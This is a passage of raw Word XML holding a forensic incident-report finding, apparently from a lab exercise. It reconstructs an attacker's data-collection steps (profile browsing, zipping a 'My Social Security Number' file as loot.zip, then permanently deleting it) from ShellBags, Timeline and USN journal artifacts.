        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>collection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1083, T1005, T1560.001, T1070.004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:10 → 2020-09-19 03:47:39.785228</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>This adds detail to F-013. Every artifact below belongs to C137\Administrator (SID S-1-5-21-2232410529-1445159330-2725690660-500) during RDP session 3.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1) Folder browsing (ShellBags, sbecmd/Administrator_UsrClass.csv):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C:\Users\Administrator\Downloads at 03:40:04 and C:\Windows\System32 at 03:40:23.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Admin\Documents, Downloads, Music, OneDrive and Pictures at 03:45:07-03:45:19.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- mortysmith\Documents at 03:45:29 (first interacted), then mortysmith Desktop, Downloads, Music, Videos and Saved Games at 03:47:32-03:49:12.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ricksanchez Desktop, Documents, Downloads and Saved Games at 03:49:46-03:51:14.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- This PC\Documents, Pictures, Downloads, Desktop, Music and Videos at 03:38:45-03:51:47.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The TypedPaths key LastWrite is 03:45:08, so a path was typed in the Explorer address bar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2) Files opened (Windows Timeline in the Administrator ActivitiesCache, SIDR ActivityHistory, Jump Lists, LNK):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Notepad: C:\Users\mortysmith\Documents\My Social Security Number.txt at 03:45:34 (ObjectId {DD6765CD-F9F7-11EA-95EC-000C2914C295}).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Notepad: Plans.txt at 03:45:39-03:45:51.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Photos: Portal_gun.png at 03:45:54-03:46:02.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Notepad: C:\Users\mortysmith\Desktop\Thoughts.txt at 03:47:39-03:47:48.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Notepad jump list 9b9cdc69c1c24e2b, Photos a52b0784bd667468 and Quick Access 5f7b5f1e01b83767 all carry the same times.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3) Archive staging ($UsnJrnl, usnjrnl.csv rows 36753-36805):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:46:15.2696: FileCreate of "My Social Security Number.zip" in .\Users\mortysmith\Documents (MFT 87445-3). The .zip~RF822ef7.TMP swap file was created and deleted, and the final archive was written as MFT entry 87470-2. This is the Explorer "Send to &gt; Compressed (zipped) folder" pattern.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:46:18.0693: rename My Social Security Number.zip → loot.zip (RenameOldName/RenameNewName, MFT 87470-2).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Explorer then created C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\loot.lnk (03:46:18.1295), and RecentDocs\.zip shows loot.zip.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:47:09.9174: FileDelete|Close of loot.zip (MFT 87470-2). No $R/$I rename into $Recycle.Bin appears in $J, so this was a permanent delete (Shift+Del or a programmatic delete), not a move to the Recycle Bin.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- MFT entry 87470 was reused 30 s later (sequence 3) by Thoughts.lnk (Created 03:47:39.785). The archive record is therefore gone from $MFT. The source files are still present: My Social Security Number.txt (22 B, MFT 91143), Plans.txt (141 B, MFT 91250), Thoughts.txt (7 B, MFT 91203) and Portal_gun.png (130,678 B, MFT 96326).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Memory filescan only holds a FILE_OBJECT for \Users\mortysmith\Desktop\Thoughts.txt. No loot.zip object is resident.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Several independent artifacts agree on a deliberate, hands-on-keyboard collection sequence: ShellBags from UsrClass, ActivitiesCache, SIDR, Jump Lists/LNK, and $UsnJrnl/$MFT from the file system. The attacker enumerated every local profile (Admin, mortysmith, ricksanchez) looking for valuable data. They opened three text files and one image belonging to mortysmith, compressed them with Explorer's built-in zip, renamed the archive to "loot.zip" (which makes the intent explicit), and deleted it permanently about 51 s later.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The archive was most likely exfiltrated in the 03:46:18-03:47:09 interval. Probable channels are the RDP session itself (clipboard or drive redirection) or the live Meterpreter session (PID 8324 had exited at 03:43:10, but the session migrated into spoolsv.exe, see F-015). Exfiltration is not proven: the pcap shows no cleartext transfer (step 5), and RDP and C2 are encrypted.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Two points are inferences, not observed facts. The exact archive content is inferred from the zip's initial name and the files opened just before; the deleted record could not be recovered. The permanent delete could be a Shift+Delete in Explorer or a delete issued through Meterpreter; the artifacts cannot tell these apart.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (14)</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2020-09-18 22:46:40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\mortysmith\Documents</w:t>
              <w:br/>
              <w:t>Directory Documents MFT=88824 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:46:40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\mortysmith\Saved Games</w:t>
              <w:br/>
              <w:t>Directory Saved Games MFT=88818 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:44:12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\ricksanchez\Documents</w:t>
              <w:br/>
              <w:t>Directory Documents MFT=87867 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Users\Admin\Documents</w:t>
              <w:br/>
              <w:t>Directory Documents MFT=84010 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15.269625</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\My Social Security Number.zip</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=87445-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36753</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.069334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:09.917465</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:39.785228</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $SI modification (M) ; $SI access (A) ; $SI MFT change (C)</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Thoughts.lnk</w:t>
              <w:br/>
              <w:t>size=979</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#114154</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:50:19.426026</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\My Social Security Number.txt</w:t>
              <w:br/>
              <w:t>size=22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#117827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:45:34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\notepad.exe</w:t>
              <w:br/>
              <w:t>My Social Security Number.txt (Notepad) C:\Users\mortysmith\Documents\My Social Security Number.txt (file:Unmapped GUID: //C:/Users/mortysmith/Documents/My Scial Security Number.txt?VolumeId={26F70DB0-6894-4B1D-8F05-4CB89F106AC5}&amp;ObjectId={DD6765CD-F9F7-11EA-95EC-000C2914C295}&amp;KnownFolderId=UserProfiles&amp;KnownFolderLength=8) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:39</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\notepad.exe</w:t>
              <w:br/>
              <w:t>Thoughts.txt (Notepad) C:\Users\mortysmith\Desktop\Thoughts.txt (file:Unmapped GUID: //C:/Users/mortysmith/Desktop/Thoughs.txt?VolumeId={26F70DB0-6894-4B1D-8F05-4CB89F106AC5}&amp;ObjectId={DD676585-F9F7-11EA-95EC-000C2914C295}&amp;KnownFolderId=UserProfiles&amp;KnownFolderLength=8) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04.500156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
